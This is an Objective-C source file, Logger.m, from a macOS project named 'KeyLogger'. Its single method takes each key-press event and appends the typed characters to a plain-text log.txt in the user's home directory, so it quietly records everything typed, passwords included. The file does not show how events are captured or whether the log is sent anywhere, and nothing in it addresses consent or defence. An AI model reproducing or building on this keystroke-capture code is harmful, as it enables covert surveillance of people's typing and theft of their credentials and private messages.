//
//  Logger.m
//  KeyLogger
//
//  Created by Dillon-Dev on 3/30/14.
//  Copyright (c) 2014 Dillon-Dev. All rights reserved.
//

#import "Logger.h"

@implementation Logger

+ (void)handleKeyPress:(NSEvent *)event {
    NSLog(@"%@", [event characters]);
    
    NSString *file = [NSString stringWithFormat:@"%@/log.txt", NSHomeDirectory()];      // Log file location
    
    NSString *contents = [NSString stringWithContentsOfFile:file encoding:NSUTF8StringEncoding error:nil];
    contents = [contents stringByAppendingString:[event characters]];
    [contents writeToFile:file atomically:YES encoding:NSUTF8StringEncoding error:nil];
}


@end
